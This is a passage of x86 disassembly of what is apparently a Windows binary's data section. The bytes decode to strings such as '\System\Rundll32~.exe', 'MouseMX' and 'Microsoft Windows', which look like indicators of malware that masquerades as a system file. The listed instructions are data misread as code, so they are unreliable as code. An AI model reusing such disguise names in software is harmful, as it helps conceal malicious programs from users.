  40af4f:	00 ff                	add    %bh,%bh
  40af51:	ff                   	(bad)
  40af52:	ff                   	(bad)
  40af53:	ff 04 00             	incl   (%eax,%eax,1)
  40af56:	00 00                	add    %al,(%eax)
  40af58:	2f                   	das
  40af59:	4f                   	dec    %edi
  40af5a:	55                   	push   %ebp
  40af5b:	54                   	push   %esp
  40af5c:	00 00                	add    %al,(%eax)
  40af5e:	00 00                	add    %al,(%eax)
  40af60:	ff                   	(bad)
  40af61:	ff                   	(bad)
  40af62:	ff                   	(bad)
  40af63:	ff 15 00 00 00 5c    	call   *0x5c000000
  40af69:	53                   	push   %ebx
  40af6a:	79 73                	jns    0x40afdf
  40af6c:	74 65                	je     0x40afd3
  40af6e:	6d                   	insl   (%dx),%es:(%edi)
  40af6f:	5c                   	pop    %esp
  40af70:	52                   	push   %edx
  40af71:	75 6e                	jne    0x40afe1
  40af73:	64 6c                	fs insb (%dx),%es:(%edi)
  40af75:	6c                   	insb   (%dx),%es:(%edi)
  40af76:	33 32                	xor    (%edx),%esi
  40af78:	7e 2e                	jle    0x40afa8
  40af7a:	65 78 65             	gs js  0x40afe2
  40af7d:	00 00                	add    %al,(%eax)
  40af7f:	00 ff                	add    %bh,%bh
  40af81:	ff                   	(bad)
  40af82:	ff                   	(bad)
  40af83:	ff 02                	incl   (%edx)
  40af85:	00 00                	add    %al,(%eax)
  40af87:	00 3a                	add    %bh,(%edx)
  40af89:	5c                   	pop    %esp
  40af8a:	00 00                	add    %al,(%eax)
  40af8c:	ff                   	(bad)
  40af8d:	ff                   	(bad)
  40af8e:	ff                   	(bad)
  40af8f:	ff 08                	decl   (%eax)
  40af91:	00 00                	add    %al,(%eax)
  40af93:	00 4d 6f             	add    %cl,0x6f(%ebp)
  40af96:	75 73                	jne    0x40b00b
  40af98:	65 5f                	gs pop %edi
  40af9a:	4d                   	dec    %ebp
  40af9b:	58                   	pop    %eax
  40af9c:	00 00                	add    %al,(%eax)
  40af9e:	00 00                	add    %al,(%eax)
  40afa0:	ff                   	(bad)
  40afa1:	ff                   	(bad)
  40afa2:	ff                   	(bad)
  40afa3:	ff 07                	incl   (%edi)
  40afa5:	00 00                	add    %al,(%eax)
  40afa7:	00 4d 6f             	add    %cl,0x6f(%ebp)
  40afaa:	75 73                	jne    0x40b01f
  40afac:	65 4d                	gs dec %ebp
  40afae:	58                   	pop    %eax
  40afaf:	00 ff                	add    %bh,%bh
  40afb1:	ff                   	(bad)
  40afb2:	ff                   	(bad)
  40afb3:	ff 0e                	decl   (%esi)
  40afb5:	00 00                	add    %al,(%eax)
  40afb7:	00 53 79             	add    %dl,0x79(%ebx)
  40afba:	73 74                	jae    0x40b030
  40afbc:	65 6d                	gs insl (%dx),%es:(%edi)
  40afbe:	20 4d 6f             	and    %cl,0x6f(%ebp)
  40afc1:	75 73                	jne    0x40b036
  40afc3:	65 4d                	gs dec %ebp
  40afc5:	58                   	pop    %eax
  40afc6:	00 00                	add    %al,(%eax)
  40afc8:	ff                   	(bad)
  40afc9:	ff                   	(bad)
  40afca:	ff                   	(bad)
  40afcb:	ff 11                	call   *(%ecx)
  40afcd:	00 00                	add    %al,(%eax)
  40afcf:	00 4d 69             	add    %cl,0x69(%ebp)
  40afd2:	63 72 6f             	arpl   %esi,0x6f(%edx)
  40afd5:	73 6f                	jae    0x40b046
  40afd7:	66 74 20             	data16 je 0x40affa
  40afda:	57                   	push   %edi
  40afdb:	69 6e 64 6f 77 73 00 	imul   $0x73776f,0x64(%esi),%ebp
	...
